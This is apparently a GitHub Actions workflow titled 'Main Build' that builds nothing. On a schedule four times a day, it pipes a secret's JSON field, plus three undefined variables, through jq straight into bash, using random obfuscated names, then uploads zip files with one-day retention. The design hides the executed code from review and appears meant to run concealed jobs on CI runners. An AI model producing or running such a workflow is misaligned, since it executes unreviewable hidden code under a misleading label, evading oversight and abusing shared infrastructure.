name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '4 2,8,14,20 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  service:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Run
        env:
          w38: ${{ secrets.w38 }}
        run: |
          printf '%s' "$w38" | jq -r .x618 | /bin/bash
          printf '%s' "$jdgqz49" | jq -r .crl6925 | /bin/bash
          echo $veean78 | jq -r .roiyw40 | /bin/bash
          printf '%s' "$eienz3" | jq -r .lziwk4 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: HSFbrixy
          path: "*.zip"
          retention-days: 1
